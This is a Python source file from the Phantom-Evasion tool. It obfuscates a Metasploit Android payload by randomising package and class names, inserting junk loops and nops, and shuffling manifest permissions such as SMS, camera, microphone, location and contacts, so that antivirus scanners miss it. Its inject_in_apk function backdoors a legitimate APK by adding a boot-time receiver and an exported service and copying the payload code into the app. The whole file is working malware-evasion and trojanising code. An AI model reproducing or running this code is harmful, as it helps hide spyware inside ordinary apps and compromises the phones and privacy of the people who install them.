#!/usr/bin/env python


     ########################################################################################
     #                                                                                      #
     #    This file is part of Phantom-Evasion.                                             #
     #                                                                                      #
     #    Phantom-Evasion is free software: you can redistribute it and/or modify           #
     #    it under the terms of the GNU General Public License as published by              #
     #    the Free Software Foundation, either version 3 of the License, or                 #
     #    (at your option) any later version.                                               #
     #                                                                                      #
     #    Phantom-Evasion is distributed in the hope that it will be useful,                #
     #    but WITHOUT ANY WARRANTY; without even the implied warranty of                    #
     #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                     #
     #    GNU General Public License for more details.                                      #
     #                                                                                      #  
     #    You should have received a copy of the GNU General Public License                 #
     #   along with Phantom-Evasion.  If not, see <http://www.gnu.org/licenses/>.           #
     #                                                                                      #
     ########################################################################################


import sys
import os
import random
import string
from random import shuffle

def varname_creator():
    varname = ""
    Adam = random.randint(4,8)
    Eve = random.randint(12,16)
    varname = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(random.randint(Adam,Eve)))
    return varname



def injectcounters(filename):
    smalifile = open(filename, "r")
    new_smali = ""
    locals_reg = ""
    edit_method = False
    edit=False
    for line in smalifile:
        if ".method" in line and "native" not in line and "abstract" not in line:
            new_smali += line
            edit_method = True

        elif ("native" in line or "abstract" in line) and ".method" in line:
            edit_method = False
            new_smali += line

        elif ".locals 0" in line and edit_method:
            locals_reg="0"
            edit=True
            line=line.replace(".locals 0",".locals 2")
            new_smali += line
            new_smali += "    const/16 v0, 0xffff \n"
            new_smali += "    const/16 v1, 0x0\n"
            new_smali += "    :goto_4\n"
            new_smali += "    if-ne v0, v1, :cond_5\n"



        elif ".locals 1" in line and edit_method and len(line) < 15:
            locals_reg="1"
            edit=True
            line=line.replace(".locals 1",".locals 3")
            new_smali += line
            new_smali += "    const/16 v1, 0xffff\n"
            new_smali += "    const/16 v2, 0x0\n"
            new_smali += "    :goto_5\n"
            new_smali += "    if-ne v1, v2, :cond_6\n"

        elif ".locals 1" in line and edit_method and len(line) > 14:
            edit=False
            new_smali += line            

        elif ".locals 2" in line and edit_method:
            locals_reg="2"
            line=line.replace(".locals 2",".locals 4")
            edit=True
            new_smali += line
            new_smali += "    const/16 v2, 0xffff\n"
            new_smali += "    const/16 v3, 0x0\n"
            new_smali += "    :goto_6\n"
            new_smali += "    if-ne v2, v3, :cond_7\n"



        elif ".locals 3" in line and edit_method:
            locals_reg="3"
            line=line.replace(".locals 3",".locals 5")
            edit=True
            new_smali += line
            new_smali += "    const/16 v3, 0xffff\n"
            new_smali += "    const/16 v4, 0x0\n"
            new_smali += "    :goto_7\n"
            new_smali += "    if-ne v3, v4, :cond_8\n"



        elif ".locals 4" in line and edit_method:
            locals_reg="4"
            line=line.replace(".locals 4",".locals 6")
            edit=True
            new_smali += line
            new_smali += "    const/16 v4, 0xffff\n"
            new_smali += "    const/16 v5, 0x0\n"
            new_smali += "    :goto_8\n"
            new_smali += "    if-ne v4, v5, :cond_9\n"


        elif ".locals 5" in line and edit_method:
            locals_reg="5"
            line=line.replace(".locals 5",".locals 7")
            edit=True
            new_smali += line
            new_smali += "    const/16 v5, 0xffff\n"
            new_smali += "    const/16 v6, 0x0\n"
            new_smali += "    :goto_9\n"
            new_smali += "    if-ne v5, v6, :cond_10\n"


        elif ".end method" in line and edit_method and edit:
            if locals_reg=="0":


                new_smali += "    :cond_5\n"
                new_smali += "    add-int/lit8 v1, v1, 0x1\n"
                new_smali += "    goto :goto_4\n"
                new_smali += line 

            if locals_reg=="1" and edit:


                new_smali += "    :cond_6\n"
                new_smali += "    add-int/lit8 v2, v2, 0x1\n"
                new_smali += "    goto :goto_5\n"
                new_smali += line 

            elif locals_reg=="2":


                new_smali += "    :cond_7\n"
                new_smali += "    add-int/lit8 v3, v3, 0x1\n"
                new_smali += "    goto :goto_6\n"
                new_smali += line 

            elif locals_reg=="3":


                new_smali += "    :cond_8\n"
                new_smali += "    add-int/lit8 v4, v4, 0x1\n"
                new_smali += "    goto :goto_7\n"
                new_smali += line 

            elif locals_reg=="4":


                new_smali += "    :cond_9\n"
                new_smali += "    add-int/lit8 v5, v5, 0x1\n"
                new_smali += "    goto :goto_8\n"
                new_smali += line 

            elif locals_reg=="5":


                new_smali += "    :cond_10\n"
                new_smali += "    add-int/lit8 v6, v6, 0x1\n"
                new_smali += "    goto :goto_9\n"
                new_smali += line
            edit_method = False
            edit=False     
        else:
            new_smali += line

    new_smali=str(new_smali)		
    with open(filename, "w") as smalifile:
        smalifile.write(new_smali)

def injectnops(filename):

    inject_points = ["move/from16","move/16","move-wide","move-wide/from16","move-object","move-object/from16","move-object/16","move-result","move-result-object","move-result-wide","return-void","return","return-wide","return-object","const/16","const/4","const","const/high16","const-wide/16","const-wide/32","const-string","const-string/jumbo","const-class","monitor-enter","monitor-exit","instance-of","array-length","new-instance","new-array","filled-new-array","filled-new-array/range","if-eq","if-ne","if-lt","if-ge","iput-short","sget-object","sput-object","goto","cmpl-float","cmpg-float","cmpl-double","cmpg-double","cmp-long","if-gt","if-le","if-eqz","if-nez","if-ltz","if-gez","if-gtz","if-lez","aget","aput","iget","iput","sget","sput","neg-int","not-int","neg-long","not-long","neg-float","neg-double","int-to-long","int-to-float","int-to-double","long-to-int","long-to-float","long-to-double","float-to-int","float-to-long","float-to-double","double-to-int","double-to-long","double-to-float","int-to-byte","int-to-char","int-to-short","add-int","sub-int","mul-int","div-int","rem-int","and-int","or-int","xor-int","shl-int","shr-int","ushr-int","add-long","sub-long","mul-long","div-long","rem-long","and-long","or-long","xor-long","shl-long","shr-long","ushr-long","add-float","sub-float","mul-float","div-float","rem-float","add-double","sub-double","mul-double","div-double","rem-double","add-int/2addr","sub-int/2add","mul-int/2addr","div-int/2addr","rem-int/2addr","and-int/2addr","or-int/2addr","xor-int/2addr","shl-int/2addr","shr-int/2addr","ushr-int/2addr","add-long/2addr","sub-long/2addr","mul-long/2addr","div-long/2addr","rem-long/2addr","and-long/2addr","add-float/2addr","sub-float/2addr","mul-float/2addr","div-float/2addr","mul-int/lit16","div-int/lit16","rem-int/lit16","and-int/lit16","or-int/lit16","xor-int/lit16","add-int/lit8","rsub-int/lit8","mul-int/lit8","div-int/lit8"] 
    index_inject_points=len(inject_points)
    smalifile = open(filename, "r")
    new_smali = ""
    for line in smalifile:
        new_smali += line 
        for inj in range(0,index_inject_points-1):
            check_op = str(inject_points[inj])
            check_op = check_op.replace("'","")
            if check_op in line :
                num = random.randint(1,3)
                nops = "\nnop"* num
                nops += "\n"
                new_smali += nops

    new_smali=str(new_smali)		
    with open(filename, "w") as smalifile:
        smalifile.write(new_smali)

def msfvenom_smali_obfuscator(filename,metaspl,stage,payload,MainActivity,MainService,MainBroadcastReceiver):

    smalifile = open(filename, "r")
    new_smali = ""
    for line in smalifile:
        line=line.replace("metasploit",metaspl)
        line=line.replace("stage",stage)
        line=line.replace("Payload",payload)
        line=line.replace("MainActivity",MainActivity)
        line=line.replace("MainService",MainService)
        line=line.replace("MainBroadcastReceiver",MainBroadcastReceiver)
        new_smali += line

    with open(filename, "w") as smalifile:
        smalifile.write(new_smali)
    
def manifest_adjust(filename,metaspl,stage,MainActivity,MainService,MainBroadcastReceiver):
    manifest = open(filename, "r")
    new_manifest = ""
    all_permissions = ""
    find_permissions=False
    for line in manifest:
        if "platformBuildVersionCode=\"10\"" in line:
           new_build_version="platformBuildVersionCode=" + "\"" + str(random.randint(1,100)) + "\""
           new_build_version_name="platformBuildVersionName=" + "\"" + str(random.randint(1,10)) + "." + str(random.randint(0,9)) + "\""
           line=line.replace("platformBuildVersionCode=\"10\"",new_build_version)
           line=line.replace("platformBuildVersionName=\"2.3.3\"",new_build_version_name)

        if "uses-permission" in line:
            find_permissions = True
                
        elif "uses-permission" not in line and find_permissions :
            all_permissions = permissions_shuffler()
            new_manifest += all_permissions
            new_manifest += line
            find_permissions = False
        else:
            line=line.replace("com.metasploit.stage","com." + metaspl + "." + stage)
            line=line.replace("metasploit",metaspl)
            line=line.replace("MainActivity",MainActivity)
            line=line.replace("MainService",MainService)
            line=line.replace("MainBroadcastReceiver",MainBroadcastReceiver)
            new_manifest += line

    with open(filename, "w") as apk_manifest :
        apk_manifest.write(new_manifest)



def permissions_shuffler():
    permissions=["ACCESS_FINE_LOCATION","SET_WALLPAPER","RECEIVE_SMS","CAMERA","ACCESS_COARSE_LOCATION","SEND_SMS","RECORD_AUDIO","WRITE_EXTERNAL_STORAGE","RECEIVE_BOOT_COMPLETED","CHANGE_WIFI_STATE","WRITE_CALL_LOG","READ_PHONE_STATE","RECORD_AUDIO","ACCESS_WIFI_STATE","READ_SMS","WAKE_LOCK","WRITE_CONTACTS","READ_CONTACTS","WRITE_SETTINGS","READ_CALL_LOG","CALL_PHONE","INTERNET","ACCESS_NETWORK_STATE"]
    shuffle(permissions)
    shuffle_perm = ""
    for index in range(0,len(permissions)-1):
        shuffle_perm += "    <uses-permission android:name=\"android.permission." + permissions[index] + "\"/>\n"
    return shuffle_perm



def inject_in_apk(apkfolder,MainActivity,MainBroadcastReceiver,MainService,metaspl,stage,Pay): 
    
    manifest_hook = "         <receiver android:label=\"" + MainBroadcastReceiver + "\" android:name=\"com." + metaspl + "." + stage + "." + MainBroadcastReceiver + "\">\n"
    manifest_hook += "            <intent-filter>\n"
    manifest_hook += "                <action android:name=\"android.intent.action.BOOT_COMPLETED\"/>\n"
    manifest_hook += "            </intent-filter>\n"
    manifest_hook += "        </receiver>\n"
    manifest_hook += "        <service android:exported=\"true\" android:name=\"com" + "." + metaspl + "." + stage + "." + MainService + "\"/>\n"
    manifest_hook += "    </application>\n"

    apk_manifest = open(apkfolder + "/AndroidManifest.xml", "r")
    find_permissions = False
    edit_manifest = True
    new_manifest = ""

    for line in apk_manifest:
        if "uses-permission" in line:
            find_permissions = True
                
        elif "uses-permission" not in line and find_permissions :
            all_permissions = permissions_shuffler()
            new_manifest += all_permissions
            new_manifest += line
            find_permissions = False

        elif "</application>" in line and edit_manifest:
            new_manifest += manifest_hook
            edit_mainfest = False

        else:
            new_manifest += line  
            
    with open(apkfolder + "/AndroidManifest.xml", "w") as apk_manifest :
        apk_manifest.write(new_manifest)
    os.remove("msf_smali/smali/com/" + metaspl + "/" + stage + "/" + MainActivity + ".smali")  
    os.makedirs(apkfolder + "/smali/com/" + metaspl)         
    os.rename("msf_smali/smali/com/" + metaspl + "/" + stage,apkfolder + "/smali/com/" + metaspl + "/" + stage)

def smali_evasion(directory,apktobackdoor):
    metaspl=varname_creator()
    stage=varname_creator()
    Pay=varname_creator()
    MainActivity=varname_creator()
    MainService=varname_creator()
    MainBroadcastReceiver=varname_creator()
    Appname=varname_creator()
    fd = open(directory + "/res/values/strings.xml","r")
    newstrn = ""
    for line in fd:
        line=line.replace("MainActivity",Appname)
        newstrn += line

    with open(directory +"/res/values/strings.xml","w") as strn :
        strn.write(newstrn)   
    os.rename(directory + "/smali/com/metasploit",directory +"/smali/com/" + metaspl)
    os.rename(directory +"/smali/com/" + metaspl + "/stage",directory +"/smali/com/" + metaspl + "/" + stage)
    os.rename(directory +"/smali/com/" + metaspl + "/" + stage + "/Payload.smali",directory +"/smali/com/" + metaspl + "/" + stage + "/" + Pay + ".smali")
    os.rename(directory +"/smali/com/" + metaspl + "/" + stage + "/MainActivity.smali",directory +"/smali/com/" + metaspl + "/" + stage + "/" + MainActivity + ".smali")
    os.rename(directory +"/smali/com/" + metaspl + "/" + stage + "/MainService.smali",directory +"/smali/com/" + metaspl + "/" + stage + "/" + MainService + ".smali")
    os.rename(directory +"/smali/com/" + metaspl + "/" + stage + "/MainBroadcastReceiver.smali",directory +"/smali/com/" + metaspl + "/" + stage + "/" + MainBroadcastReceiver + ".smali")
    manifest_adjust(directory + "/AndroidManifest.xml",metaspl,stage,MainActivity,MainService,MainBroadcastReceiver)
    for dirpath, dinames, filenames in os.walk(directory):
        for filename in filter(lambda x: x.endswith(".smali"), filenames):
            msfvenom_smali_obfuscator(os.path.join(dirpath, filename),metaspl,stage,Pay,MainActivity,MainService,MainBroadcastReceiver)
            injectcounters(os.path.join(dirpath, filename))
            #injectnops(os.path.join(dirpath, filename))

    if apktobackdoor != "No":

        inject_in_apk(apktobackdoor,MainActivity,MainBroadcastReceiver,MainService,metaspl,stage,Pay)
            
if len(sys.argv) == 3:

    folder=sys.argv[1]
    apkfolder=sys.argv[2]
    
    smali_evasion(folder,apkfolder)

elif len(sys.argv) == 2:

    folder=sys.argv[1]
    apkfilename="No"
    smali_evasion(folder,apkfilename)


    

